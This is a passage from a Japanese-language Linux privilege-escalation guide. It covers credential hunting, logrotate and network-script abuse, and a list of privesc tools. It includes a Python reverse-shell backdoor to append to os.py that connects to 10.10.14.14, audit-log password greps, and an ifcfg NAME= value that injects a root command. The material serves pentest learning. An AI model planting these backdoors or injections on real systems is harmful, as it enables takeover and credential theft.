find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)のコードを読んでください。これは**パスワードを含んでいる可能性のあるいくつかのファイル**を検索します。\
**もう一つの興味深いツール**として使用できるのは[**LaZagne**](https://github.com/AlessandroZ/LaZagne)で、Windows, Linux & Mac向けにローカルコンピュータに保存された多数のパスワードを取得するためのオープンソースアプリケーションです。

### ログ

ログを読める場合、**興味深い/機密情報が含まれていることがあります**。ログが奇妙であればあるほど、より興味深い（おそらく）です。\
また、いくつかの**不適切に**設定された（backdoored?）**監査ログ**は、以下の投稿で説明されているように、監査ログ内に**パスワードを記録する**ことを可能にする場合があります: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
ログを読むためには、グループ[**adm**](interesting-groups-linux-pe/index.html#adm-group)が非常に役立ちます。

### シェルファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイルの**名前**に「**password**」という語が含まれているものや、ファイルの**内容**に含まれているものも確認すべきです。また、logs 内の IPs や emails、hashes regexps も確認してください。\
ここでこれらすべてのやり方を列挙するつもりはありませんが、興味があれば [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が実行する最新のチェックを確認できます。

## 書き込み可能なファイル

### Python library hijacking

もし Python スクリプトがどの**場所**から実行されるか分かっていて、そのフォルダに**書き込み可能**であるか、または**python libraries を変更できる**なら、OS library を改変して backdoor を仕込むことができます（もし Python スクリプトが実行される場所に書き込みできるなら、os.py ライブラリをコピー＆ペーストしてください）。

ライブラリに **backdoor** を仕込むには、os.py ライブラリの末尾に次の行を追加してください（IP と PORT を変更）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate の悪用

`logrotate` の脆弱性により、ログファイルやその親ディレクトリに対して **書き込み権限** を持つユーザーが権限昇格を行える可能性があります。これは `logrotate` が多くの場合 **root** として動作しており、特に _**/etc/bash_completion.d/**_ のようなディレクトリで任意のファイルを実行するよう操作できるためです。_ /var/log_ だけでなく、ログローテーションが適用されるあらゆるディレクトリの権限を確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` バージョン `3.18.0` 以前に影響します

詳細はこのページを参照してください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) を使って悪用できます。

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**脆弱性の参照先:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由でユーザーが `ifcf-<whatever>` スクリプトを _/etc/sysconfig/network-scripts_ に **書き込み** できる、または既存のものを **調整** できる場合、あなたの **システムは乗っ取られます**。

Network scripts、例えば _ifcg-eth0_ はネットワーク接続に使用されます。見た目はまさに .INI ファイルのようです。しかし、これらは Linux 上で Network Manager (dispatcher.d) によって ~読み込まれます~。

私の場合、これらのネットワークスクリプト内の `NAME=` に割り当てられた値が正しく処理されていません。名前に空白/ブランクスペースが含まれていると、システムは空白の後の部分を実行しようとします。つまり、最初の空白以降のすべてが root として実行されます。

例えば: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network と /bin/id の間の空白に注意_)

### **init, init.d, systemd, and rc.d**

ディレクトリ `/etc/init.d` は System V init (SysVinit) 用の **スクリプト** の置き場です。**古典的な Linux のサービス管理システム** に属します。ここにはサービスを `start`、`stop`、`restart`、場合によっては `reload` するためのスクリプトが含まれます。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では別のパスとして `/etc/rc.d/init.d` があります。

一方で、`/etc/init` は **Upstart** に関連しており、Ubuntu によって導入された新しい **service management** で、サービス管理タスクのために設定ファイルを使用します。Upstart への移行後も互換レイヤーのために SysVinit スクリプトは Upstart 設定と並行して利用され続けています。

**systemd** はモダンな初期化およびサービスマネージャとして登場し、オンデマンドでのデーモン起動、automount の管理、システム状態のスナップショットなどの高度な機能を提供します。配布パッケージ用には `/usr/lib/systemd/`、管理者による変更用には `/etc/systemd/system/` にファイルを配置することで、システム管理作業を簡素化します。

## その他のトリック

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は一般的に syscall をフックしてカーネルの特権機能を userspace の manager に公開します。FD-order に基づく署名チェックや不十分なパスワード方式などの弱い manager 認証により、ローカルアプリが manager を偽装して既に root 化されたデバイスで root にエスカレートできる場合があります。詳細とエクスプロイトは以下を参照してください：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex 駆動の service discovery が VMware Tools/Aria Operations 内でプロセスのコマンドラインからバイナリパスを抽出し、特権コンテキストで `-v` を付けて実行することがあります。許容度の高いパターン（例: `\S` を使用）が書き込み可能な場所（例: `/tmp/httpd`）に配置した攻撃者用リスナーと一致すると、root としての実行に繋がる可能性があります（CWE-426 Untrusted Search Path）。

詳細と他の discovery/monitoring スタックにも適用できる一般化パターンは以下を参照してください：

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux と MAC のカーネル脆弱性を列挙するツール [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
